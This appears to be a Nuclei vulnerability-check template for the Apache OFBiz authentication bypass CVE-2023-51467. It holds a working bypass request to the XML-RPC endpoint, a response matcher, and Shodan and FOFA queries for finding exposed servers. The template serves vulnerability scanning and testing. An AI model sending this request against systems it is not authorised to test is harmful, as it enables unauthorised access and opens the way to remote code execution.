id: CVE-2023-51467

info:
  name: Apache OFBiz Authentication Bypass Vulnerability (CVE-2023-51467)
  author: Mohamed Benchikh
  severity: high
  description: |
     Authentication bypass vulnerability in Apache OFBiz, a Java-based web framework, successfully exploitation of this vulnerability may allow for remote code execution
  classification:
    cve-id: CVE-2023-51467
    cwe-id: CWE-287
  metadata:
    vendor: apache
    product: ofbiz
    shodan-query: html:"OFBiz"
    fofa-query: app="Apache_OFBiz"
  reference:
    - https://threatprotect.qualys.com/2023/12/27/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-51467/
    - https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/
  tags: ofbiz, ssrf, rce, cve-2023-51467

variables:
  password: "{{randstr}}"
  method_name: "{{randstr}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/webtools/control/xmlrpc?USERNAME&PASSWORD={{password}}&requirePasswordChange=Y"
    headers:
      Content-Type: "application/xml"

    body: '<?xml version="1.0"?><methodCall><methodName>{{method_name}}</methodName><params><param><value>Apache</value></param></params></methodCall>'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "No such service [{{method_name}}]"

      - type: status
        status:
          - 200
